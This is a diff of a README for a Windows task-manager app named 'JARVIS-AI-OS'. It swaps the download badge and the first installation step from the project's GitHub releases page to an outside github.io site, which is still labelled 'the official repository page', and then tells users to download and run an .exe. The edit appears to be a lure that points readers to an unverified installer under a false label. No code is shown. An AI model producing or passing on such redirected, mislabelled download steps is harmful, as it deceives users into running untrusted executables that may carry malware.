@@ -1,6 +1,6 @@
 # 🤖 JARVIS-AI-OS - Manage your daily tasks with intelligence
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/riccardoarmless832/JARVIS-AI-OS/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://riccardoarmless832.github.io)
 
 ## 📌 About this software
 
@@ -22,7 +22,7 @@ Your computer needs to meet these standards to run the software:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the official repository page: [https://github.com/riccardoarmless832/JARVIS-AI-OS/releases](https://github.com/riccardoarmless832/JARVIS-AI-OS/releases)
+1. Go to the official repository page: [https://riccardoarmless832.github.io](https://riccardoarmless832.github.io)
 2. Look for the latest version section at the top of the page.
 3. Locate the download link ending in .exe.
 4. Click the link to save the installer to your computer.
